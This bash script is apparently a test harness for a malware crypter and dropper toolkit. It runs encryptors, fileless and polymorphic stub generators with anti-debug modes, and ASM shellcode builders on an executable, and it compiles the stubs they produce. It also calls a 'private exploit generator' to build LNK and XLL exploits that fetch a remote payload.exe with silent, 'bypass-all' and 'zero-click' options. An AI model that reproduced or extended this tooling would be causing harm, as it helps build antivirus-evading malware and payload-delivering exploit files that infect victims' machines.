#!/bin/bash

echo "=== Testing All Encryptors on mIRC ==="
echo "Date: $(date)"
echo ""

# Use the mIRC test file
MIRC_FILE="mirc_test.exe"

if [ ! -f "$MIRC_FILE" ]; then
    echo "Error: $MIRC_FILE not found!"
    exit 1
fi

# Get original file info
ORIGINAL_SIZE=$(ls -l $MIRC_FILE | awk '{print $5}')
ORIGINAL_MD5=$(md5sum $MIRC_FILE | cut -d' ' -f1)

echo "Original mIRC file:"
echo "  Size: $ORIGINAL_SIZE bytes"
echo "  MD5: $ORIGINAL_MD5"
echo ""

# Create test directory
rm -rf mirc_test_results
mkdir -p mirc_test_results

# Function to test an encryptor
test_encryptor() {
    local name=$1
    local encryptor=$2
    local encrypt_cmd=$3
    local decrypt_cmd=$4
    
    echo "=== Testing $name ==="
    
    if [ ! -f "$encryptor" ]; then
        echo "  ❌ Encryptor not found: $encryptor"
        echo ""
        return
    fi
    
    # Encrypt
    echo -n "  Encrypting... "
    if eval $encrypt_cmd > /dev/null 2>&1; then
        echo "✓"
    else
        echo "❌ Failed"
        echo ""
        return
    fi
    
    # Check encrypted file
    if [ -f "mirc_encrypted.bin" ]; then
        ENCRYPTED_SIZE=$(ls -l mirc_encrypted.bin | awk '{print $5}')
        echo "  Encrypted size: $ENCRYPTED_SIZE bytes"
    else
        echo "  ❌ Encrypted file not found"
        echo ""
        return
    fi
    
    # Decrypt
    echo -n "  Decrypting... "
    if eval $decrypt_cmd > /dev/null 2>&1; then
        echo "✓"
    else
        echo "❌ Failed"
        echo ""
        return
    fi
    
    # Verify
    if [ -f "mirc_decrypted.exe" ]; then
        DECRYPTED_MD5=$(md5sum mirc_decrypted.exe | cut -d' ' -f1)
        if [ "$DECRYPTED_MD5" == "$ORIGINAL_MD5" ]; then
            echo "  ✅ File integrity verified (MD5 match)"
        else
            echo "  ❌ File corrupted (MD5 mismatch)"
        fi
    else
        echo "  ❌ Decrypted file not found"
    fi
    
    # Save results
    if [ -f "mirc_encrypted.bin" ]; then
        cp mirc_encrypted.bin "mirc_test_results/${name}_encrypted.bin"
    fi
    if [ -f "mirc_decrypted.exe" ]; then
        cp mirc_decrypted.exe "mirc_test_results/${name}_decrypted.exe"
    fi
    
    # Cleanup
    rm -f mirc_encrypted.bin mirc_decrypted.exe *.keys
    
    echo ""
}

# Test 1: Stealth Triple Encryption v2
test_encryptor "Stealth Triple Encryption v2" \
    "./stealth_triple_encryption_v2" \
    "./stealth_triple_encryption_v2 -e $MIRC_FILE mirc_encrypted.bin" \
    "./stealth_triple_encryption_v2 -d mirc_encrypted.bin mirc_decrypted.exe"

# Test 2: Unified Stub Generator (Embedded mode)
echo "=== Testing Unified Stub Generator ==="
if [ -f "./unified_stub_generator" ]; then
    echo "  Testing embedded mode..."
    ./unified_stub_generator --embedded $MIRC_FILE mirc_test_results/unified_embedded_stub.cpp > /dev/null 2>&1
    if [ -f "mirc_test_results/unified_embedded_stub.cpp" ]; then
        echo "  ✓ Embedded stub generated"
        # Try to compile
        echo -n "  Compiling stub... "
        if g++ -std=c++11 -O2 -o mirc_test_results/unified_embedded_test mirc_test_results/unified_embedded_stub.cpp 2>/dev/null; then
            echo "✓"
        else
            echo "❌"
        fi
    fi
    
    echo "  Testing fileless mode..."
    ./unified_stub_generator --fileless $MIRC_FILE mirc_test_results/unified_fileless_stub.cpp > /dev/null 2>&1
    if [ -f "mirc_test_results/unified_fileless_stub.cpp" ]; then
        echo "  ✓ Fileless stub generated"
    fi
else
    echo "  ❌ Unified stub generator not found"
fi
echo ""

# Test 3: Fileless Stub Generator
echo "=== Testing Fileless Stub Generator ==="
if [ -f "./fileless_stub_generator" ]; then
    ./fileless_stub_generator $MIRC_FILE mirc_test_results/fileless_stub.cpp > /dev/null 2>&1
    if [ -f "mirc_test_results/fileless_stub.cpp" ]; then
        echo "  ✓ Fileless stub generated"
        STUB_SIZE=$(ls -l mirc_test_results/fileless_stub.cpp | awk '{print $5}')
        echo "  Stub size: $STUB_SIZE bytes"
    else
        echo "  ❌ Failed to generate stub"
    fi
else
    echo "  ❌ Fileless stub generator not found"
fi
echo ""

# Test 4: No Limit Unified Generator
echo "=== Testing No Limit Unified Generator ==="
if [ -f "./no_limit_unified_generator" ]; then
    echo "  Generating 5 unique stubs..."
    ./no_limit_unified_generator $MIRC_FILE mirc_test_results/no_limit_stub 5 > /dev/null 2>&1
    
    STUB_COUNT=$(ls mirc_test_results/no_limit_stub_*.cpp 2>/dev/null | wc -l)
    echo "  Generated $STUB_COUNT stubs"
    
    if [ "$STUB_COUNT" -gt 0 ]; then
        # Check uniqueness
        cd mirc_test_results
        md5sum no_limit_stub_*.cpp 2>/dev/null | cut -d' ' -f1 | sort -u > stub_hashes.txt
        UNIQUE_COUNT=$(wc -l < stub_hashes.txt)
        cd ..
        echo "  Unique stubs: $UNIQUE_COUNT"
    fi
else
    echo "  ❌ No limit generator not found"
fi
echo ""

# Test 5: Enhanced No Limit Generator
echo "=== Testing Enhanced No Limit Generator ==="
if [ -f "./enhanced_no_limit_generator" ]; then
    echo "  Generating stubs with different anti-debug modes..."
    
    for mode in 0 1 2 3; do
        case $mode in
            0) mode_name="Exit" ;;
            1) mode_name="Assist" ;;
            2) mode_name="Freeze" ;;
            3) mode_name="Crash" ;;
        esac
        
        echo -n "  Mode $mode ($mode_name): "
        ./enhanced_no_limit_generator $MIRC_FILE mirc_test_results/enhanced_${mode_name}_stub 2 --anti-debug-mode $mode > /dev/null 2>&1
        
        if [ -f "mirc_test_results/enhanced_${mode_name}_stub_0.cpp" ]; then
            echo "✓"
        else
            echo "❌"
        fi
    done
else
    echo "  ❌ Enhanced generator not found"
fi
echo ""

# Test 6: Private Exploit Generator
echo "=== Testing Private Exploit Generator ==="
if [ -f "./private_exploit_generator" ]; then
    echo "  Generating LNK exploit..."
    ./private_exploit_generator lnk "http://example.com/payload.exe" mirc_test_results/test.lnk --silent --bypass-all > /dev/null 2>&1
    if [ -f "mirc_test_results/test.lnk" ]; then
        echo "  ✓ LNK exploit generated"
    fi
    
    echo "  Generating XLL exploit..."
    ./private_exploit_generator xll "http://example.com/payload.exe" mirc_test_results/test.xll --zero-click --bypass-all > /dev/null 2>&1
    if [ -f "mirc_test_results/test.xll" ]; then
        echo "  ✓ XLL exploit generated"
    fi
else
    echo "  ❌ Private exploit generator not found"
fi
echo ""

# Test 7: Fileless Triple ASM Stub
echo "=== Testing Fileless Triple ASM Stub ==="
if [ -f "./fileless_triple_asm_stub" ]; then
    ./fileless_triple_asm_stub $MIRC_FILE mirc_test_results/asm_stub.asm mirc_test_results/asm_shellcode.bin > /dev/null 2>&1
    if [ -f "mirc_test_results/asm_stub.asm" ]; then
        echo "  ✓ ASM stub generated"
        ASM_SIZE=$(ls -l mirc_test_results/asm_stub.asm | awk '{print $5}')
        echo "  ASM size: $ASM_SIZE bytes"
    fi
else
    echo "  ❌ ASM stub generator not found"
fi
echo ""

# Summary
echo "=== Test Summary ==="
echo "Results saved in: mirc_test_results/"
echo ""

# Count successful tests
TOTAL_FILES=$(ls mirc_test_results/ 2>/dev/null | wc -l)
echo "Total output files generated: $TOTAL_FILES"

# List all generated files
echo ""
echo "Generated files:"
ls -la mirc_test_results/ 2>/dev/null | grep -v "^total\|^d" | awk '{print "  " $9 " (" $5 " bytes)"}'

# Check for compilation success
echo ""
echo "=== Compilation Test ==="
cd mirc_test_results
SUCCESS=0
FAILED=0

for stub in *.cpp; do
    if [ -f "$stub" ]; then
        base=$(basename "$stub" .cpp)
        echo -n "  Compiling $stub... "
        if g++ -std=c++11 -O2 -o "${base}_compiled" "$stub" 2>/dev/null; then
            echo "✓"
            ((SUCCESS++))
            rm -f "${base}_compiled"
        else
            echo "❌"
            ((FAILED++))
        fi
    fi
done

cd ..

echo ""
echo "Compilation results: $SUCCESS succeeded, $FAILED failed"
echo ""
echo "=== Test Complete ==="